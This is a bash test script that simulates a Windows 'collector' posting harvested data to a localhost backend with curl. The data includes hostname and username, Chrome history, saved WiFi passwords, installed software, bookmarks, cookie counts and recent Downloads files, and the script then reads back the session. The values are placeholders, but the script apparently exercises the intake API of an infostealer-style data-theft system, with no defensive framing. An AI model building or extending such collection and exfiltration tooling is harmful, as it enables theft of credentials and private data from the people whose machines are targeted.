#!/bin/bash
# Test script to simulate Windows collector sending data to backend

BACKEND_URL="http://localhost:8080/api/data"
SESSION_ID="test_$(date +%Y%m%d_%H%M%S)_$RANDOM"

echo "🧪 Testing Backend Data Collection"
echo "Session ID: $SESSION_ID"
echo ""

# 1. Send device info
echo "1️⃣ Sending device info..."
curl -s -X POST "$BACKEND_URL" \
  -H "Content-Type: application/json" \
  -d "{
    \"session_id\": \"$SESSION_ID\",
    \"type\": \"device_info\",
    \"device_info\": {
      \"hostname\": \"TEST-PC\",
      \"username\": \"TestUser\",
      \"userdomain\": \"WORKGROUP\",
      \"ip_address\": \"192.168.1.105\",
      \"timestamp\": \"$(date '+%m/%d/%Y %H:%M:%S')\"
    }
  }" | python3 -m json.tool
echo ""

# 2. Send Chrome history
echo "2️⃣ Sending Chrome history (3 entries)..."
curl -s -X POST "$BACKEND_URL" \
  -H "Content-Type: application/json" \
  -d "{
    \"session_id\": \"$SESSION_ID\",
    \"type\": \"chrome\",
    \"data\": [
      \"https://google.com|Google|100|13342977600000000\",
      \"https://youtube.com|YouTube|50|13342977600000001\",
      \"https://github.com|GitHub|25|13342977600000002\"
    ]
  }" | python3 -m json.tool
echo ""

# 3. Send WiFi passwords
echo "3️⃣ Sending WiFi passwords (2 networks)..."
curl -s -X POST "$BACKEND_URL" \
  -H "Content-Type: application/json" \
  -d "{
    \"session_id\": \"$SESSION_ID\",
    \"type\": \"wifi\",
    \"data\": [
      {\"network\": \"Home_WiFi\", \"password\": \"MyP@ssw0rd\"},
      {\"network\": \"Office_WiFi\", \"password\": \"Office123\"}
    ]
  }" | python3 -m json.tool
echo ""

# 4. Send system info
echo "4️⃣ Sending system info..."
curl -s -X POST "$BACKEND_URL" \
  -H "Content-Type: application/json" \
  -d "{
    \"session_id\": \"$SESSION_ID\",
    \"type\": \"system\",
    \"data\": {
      \"systeminfo\": [
        \"OS Name: Microsoft Windows 10 Pro\",
        \"OS Version: 10.0.19045 Build 19045\",
        \"System Manufacturer: Dell Inc.\",
        \"Processor: Intel(R) Core(TM) i7-9700K CPU @ 3.60GHz\"
      ],
      \"installed_software\": [
        {\"name\": \"Google Chrome\", \"version\": \"120.0.6099.130\"},
        {\"name\": \"Visual Studio Code\", \"version\": \"1.85.1\"}
      ]
    }
  }" | python3 -m json.tool
echo ""

# 5. Send bookmarks
echo "5️⃣ Sending bookmarks..."
curl -s -X POST "$BACKEND_URL" \
  -H "Content-Type: application/json" \
  -d "{
    \"session_id\": \"$SESSION_ID\",
    \"type\": \"bookmarks\",
    \"data\": {
      \"chrome\": {
        \"roots\": {
          \"bookmark_bar\": {
            \"children\": [
              {\"name\": \"Google\", \"url\": \"https://google.com\"},
              {\"name\": \"GitHub\", \"url\": \"https://github.com\"}
            ]
          }
        }
      }
    }
  }" | python3 -m json.tool
echo ""

# 6. Send cookies info
echo "6️⃣ Sending cookies info..."
curl -s -X POST "$BACKEND_URL" \
  -H "Content-Type: application/json" \
  -d "{
    \"session_id\": \"$SESSION_ID\",
    \"type\": \"cookies\",
    \"data\": {
      \"chrome_cookies_count\": 245,
      \"edge_cookies_count\": 0
    }
  }" | python3 -m json.tool
echo ""

# 7. Send recent files
echo "7️⃣ Sending recent files (5 entries)..."
curl -s -X POST "$BACKEND_URL" \
  -H "Content-Type: application/json" \
  -d "{
    \"session_id\": \"$SESSION_ID\",
    \"type\": \"recent_files\",
    \"data\": [
      {\"name\": \"document.pdf\", \"location\": \"Downloads\"},
      {\"name\": \"photo.jpg\", \"location\": \"Downloads\"},
      {\"name\": \"setup.exe\", \"location\": \"Downloads\"},
      {\"name\": \"report.xlsx\", \"location\": \"Downloads\"},
      {\"name\": \"video.mp4\", \"location\": \"Downloads\"}
    ]
  }" | python3 -m json.tool
echo ""

# 8. Query the session
echo "📊 Fetching session data..."
curl -s "http://localhost:8080/api/sessions/$SESSION_ID" | python3 -m json.tool | head -60

echo ""
echo "✅ Test complete! Session ID: $SESSION_ID"
echo ""
echo "View all sessions: curl http://localhost:8080/api/sessions"
